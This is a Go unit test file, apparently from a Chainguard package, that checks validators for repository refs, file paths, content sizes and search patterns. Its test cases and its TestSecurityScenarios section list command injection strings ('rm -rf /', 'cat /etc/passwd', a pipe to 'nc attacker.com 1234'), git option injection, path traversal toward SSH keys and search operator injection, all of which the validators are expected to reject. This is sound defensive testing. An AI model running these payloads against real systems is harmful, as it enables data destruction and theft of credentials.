/*
Copyright 2026 Chainguard, Inc.
SPDX-License-Identifier: Apache-2.0
*/

package remote

import (
	"strings"
	"testing"
)

func TestRepositoryRef_Validate(t *testing.T) {
	tests := []struct {
		name    string
		ref     *RepositoryRef
		wantErr bool
		errMsg  string
	}{
		{
			name: "valid reference",
			ref: &RepositoryRef{
				Host:  "github.com",
				Owner: "spiffe",
				Repo:  "spire",
				Ref:   "v1.10.3",
			},
			wantErr: false,
		},
		{
			name: "valid reference with complex tag",
			ref: &RepositoryRef{
				Owner: "rancher",
				Repo:  "rke2",
				Ref:   "v1.35.0+rke2r1",
			},
			wantErr: false,
		},
		{
			name: "valid reference with commit SHA",
			ref: &RepositoryRef{
				Owner: "kubernetes",
				Repo:  "kubernetes",
				Ref:   "a1b2c3d4e5f6",
			},
			wantErr: false,
		},
		{
			name: "valid reference with branch name",
			ref: &RepositoryRef{
				Owner: "golang",
				Repo:  "go",
				Ref:   "release-branch.go1.21",
			},
			wantErr: false,
		},
		{
			name:    "nil reference",
			ref:     nil,
			wantErr: true,
			errMsg:  "cannot be nil",
		},
		{
			name: "empty owner",
			ref: &RepositoryRef{
				Owner: "",
				Repo:  "spire",
				Ref:   "v1.10.3",
			},
			wantErr: true,
			errMsg:  "cannot be empty",
		},
		{
			name: "empty repo",
			ref: &RepositoryRef{
				Owner: "spiffe",
				Repo:  "",
				Ref:   "v1.10.3",
			},
			wantErr: true,
			errMsg:  "cannot be empty",
		},
		{
			name: "empty ref",
			ref: &RepositoryRef{
				Owner: "spiffe",
				Repo:  "spire",
				Ref:   "",
			},
			wantErr: true,
			errMsg:  "cannot be empty",
		},
		{
			name: "owner with invalid characters",
			ref: &RepositoryRef{
				Owner: "spiffe@malicious",
				Repo:  "spire",
				Ref:   "v1.10.3",
			},
			wantErr: true,
			errMsg:  "contains invalid characters",
		},
		{
			name: "repo with invalid characters",
			ref: &RepositoryRef{
				Owner: "spiffe",
				Repo:  "spire@malicious",
				Ref:   "v1.10.3",
			},
			wantErr: true,
			errMsg:  "contains invalid characters",
		},
		{
			name: "ref starting with double dash (git injection)",
			ref: &RepositoryRef{
				Owner: "spiffe",
				Repo:  "spire",
				Ref:   "--upload-pack",
			},
			wantErr: true,
			errMsg:  "cannot start with '--'",
		},
		{
			name: "ref starting with single dash (git injection)",
			ref: &RepositoryRef{
				Owner: "spiffe",
				Repo:  "spire",
				Ref:   "-u",
			},
			wantErr: true,
			errMsg:  "cannot start with '-'",
		},
		{
			name: "ref with semicolon (command injection)",
			ref: &RepositoryRef{
				Owner: "spiffe",
				Repo:  "spire",
				Ref:   "v1.0.0; rm -rf /",
			},
			wantErr: true,
			errMsg:  "dangerous character",
		},
		{
			name: "ref with pipe (command injection)",
			ref: &RepositoryRef{
				Owner: "spiffe",
				Repo:  "spire",
				Ref:   "v1.0.0 | cat /etc/passwd",
			},
			wantErr: true,
			errMsg:  "dangerous character",
		},
		{
			name: "ref with backtick (command substitution)",
			ref: &RepositoryRef{
				Owner: "spiffe",
				Repo:  "spire",
				Ref:   "v1.0.0`whoami`",
			},
			wantErr: true,
			errMsg:  "dangerous character",
		},
		{
			name: "ref with dollar sign (variable expansion)",
			ref: &RepositoryRef{
				Owner: "spiffe",
				Repo:  "spire",
				Ref:   "v1.0.0$malicious",
			},
			wantErr: true,
			errMsg:  "dangerous character",
		},
		{
			name: "owner too long",
			ref: &RepositoryRef{
				Owner: strings.Repeat("a", MaxOwnerLength+1),
				Repo:  "spire",
				Ref:   "v1.10.3",
			},
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
		{
			name: "repo too long",
			ref: &RepositoryRef{
				Owner: "spiffe",
				Repo:  strings.Repeat("a", MaxRepoLength+1),
				Ref:   "v1.10.3",
			},
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
		{
			name: "ref too long",
			ref: &RepositoryRef{
				Owner: "spiffe",
				Repo:  "spire",
				Ref:   strings.Repeat("a", MaxRefLength+1),
			},
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
		{
			name: "invalid host",
			ref: &RepositoryRef{
				Host:  "github$.com",
				Owner: "spiffe",
				Repo:  "spire",
				Ref:   "v1.10.3",
			},
			wantErr: true,
			errMsg:  "contains invalid characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.ref.Validate()
			if (err != nil) != tt.wantErr {
				t.Errorf("RepositoryRef.Validate() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("RepositoryRef.Validate() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

func TestValidatePath(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid simple path",
			path:    "go.mod",
			wantErr: false,
		},
		{
			name:    "valid nested path",
			path:    "api/go.mod",
			wantErr: false,
		},
		{
			name:    "valid deep nested path",
			path:    "pkg/server/cmd/go.mod",
			wantErr: false,
		},
		{
			name:    "empty path",
			path:    "",
			wantErr: true,
			errMsg:  "cannot be empty",
		},
		{
			name:    "absolute path",
			path:    "/etc/passwd",
			wantErr: true,
			errMsg:  "must be relative",
		},
		{
			name:    "path traversal with ..",
			path:    "../../../etc/passwd",
			wantErr: true,
			errMsg:  "path traversal",
		},
		{
			name:    "path traversal in middle",
			path:    "api/../../../etc/passwd",
			wantErr: true,
			errMsg:  "path traversal",
		},
		{
			name:    "just ..",
			path:    "..",
			wantErr: true,
			errMsg:  "path traversal",
		},
		{
			name:    "path starting with /",
			path:    "/go.mod",
			wantErr: true,
			errMsg:  "cannot start with '/'",
		},
		{
			name:    "path too long",
			path:    strings.Repeat("a", MaxPathLength+1),
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidatePath(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePath() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("ValidatePath() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

func TestValidateContentSize(t *testing.T) {
	tests := []struct {
		name    string
		size    int
		path    string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid size - small file",
			size:    1024,
			path:    "go.mod",
			wantErr: false,
		},
		{
			name:    "valid size - zero bytes",
			size:    0,
			path:    "empty.txt",
			wantErr: false,
		},
		{
			name:    "valid size - exactly at limit",
			size:    MaxFileSize,
			path:    "large.bin",
			wantErr: false,
		},
		{
			name:    "invalid size - too large",
			size:    MaxFileSize + 1,
			path:    "huge.bin",
			wantErr: true,
			errMsg:  "exceeds maximum",
		},
		{
			name:    "invalid size - negative",
			size:    -1,
			path:    "invalid.txt",
			wantErr: true,
			errMsg:  "cannot be negative",
		},
		{
			name:    "invalid size - way too large",
			size:    100 * 1024 * 1024, // 100 MB
			path:    "malicious.bin",
			wantErr: true,
			errMsg:  "exceeds maximum",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateContentSize(tt.size, tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateContentSize() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("ValidateContentSize() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

func TestValidatePattern(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid pattern - go.mod",
			pattern: "go.mod",
			wantErr: false,
		},
		{
			name:    "valid pattern - vendor.mod",
			pattern: "vendor.mod",
			wantErr: false,
		},
		{
			name:    "valid pattern - pom.xml",
			pattern: "pom.xml",
			wantErr: false,
		},
		{
			name:    "valid pattern - Cargo.toml",
			pattern: "Cargo.toml",
			wantErr: false,
		},
		{
			name:    "empty pattern",
			pattern: "",
			wantErr: true,
			errMsg:  "cannot be empty",
		},
		{
			name:    "pattern with forward slash",
			pattern: "api/go.mod",
			wantErr: true,
			errMsg:  "cannot contain path separators",
		},
		{
			name:    "pattern with backslash",
			pattern: "api\\go.mod",
			wantErr: true,
			errMsg:  "cannot contain path separators",
		},
		{
			name:    "pattern with repo: operator",
			pattern: "repo:spiffe/spire",
			wantErr: true,
			errMsg:  "cannot contain GitHub search operator",
		},
		{
			name:    "pattern with user: operator",
			pattern: "user:admin",
			wantErr: true,
			errMsg:  "cannot contain GitHub search operator",
		},
		{
			name:    "pattern with path: operator",
			pattern: "path:api/",
			wantErr: true,
			errMsg:  "cannot contain GitHub search operator",
		},
		{
			name:    "pattern too long",
			pattern: strings.Repeat("a", 257),
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validatePattern(tt.pattern)
			if (err != nil) != tt.wantErr {
				t.Errorf("validatePattern() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("validatePattern() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

// TestSecurityScenarios tests specific security attack scenarios.
func TestSecurityScenarios(t *testing.T) {
	t.Run("git command injection via ref", func(t *testing.T) {
		attacks := []string{
			"--upload-pack=malicious",
			"-u malicious",
			"v1.0.0; cat /etc/passwd",
			"v1.0.0 && rm -rf /",
			"v1.0.0 | nc attacker.com 1234",
			"v1.0.0`whoami`",
			"v1.0.0$(whoami)",
		}

		for _, attack := range attacks {
			ref := &RepositoryRef{
				Owner: "test",
				Repo:  "test",
				Ref:   attack,
			}
			if err := ref.Validate(); err == nil {
				t.Errorf("Expected validation to fail for git injection: %q", attack)
			}
		}
	})

	t.Run("path traversal attacks", func(t *testing.T) {
		attacks := []string{
			"../../../etc/passwd",
			"../../.ssh/id_rsa",
			"api/../../../root/.ssh/authorized_keys",
			"..",
			"../",
			"/etc/passwd",
			"/root/.ssh/id_rsa",
		}

		for _, attack := range attacks {
			if err := ValidatePath(attack); err == nil {
				t.Errorf("Expected validation to fail for path traversal: %q", attack)
			}
		}
	})

	t.Run("memory exhaustion via large content", func(t *testing.T) {
		sizes := []int{
			MaxFileSize + 1,
			MaxFileSize * 2,
			100 * 1024 * 1024,  // 100 MB
			1024 * 1024 * 1024, // 1 GB
		}

		for _, size := range sizes {
			if err := ValidateContentSize(size, "test.bin"); err == nil {
				t.Errorf("Expected validation to fail for size: %d", size)
			}
		}
	})

	t.Run("GitHub search operator injection", func(t *testing.T) {
		attacks := []string{
			"repo:evil/repo",
			"user:attacker",
			"org:malicious",
			"path:secrets/",
			"extension:pem",
			"language:go",
		}

		for _, attack := range attacks {
			if err := validatePattern(attack); err == nil {
				t.Errorf("Expected validation to fail for search operator injection: %q", attack)
			}
		}
	})
}
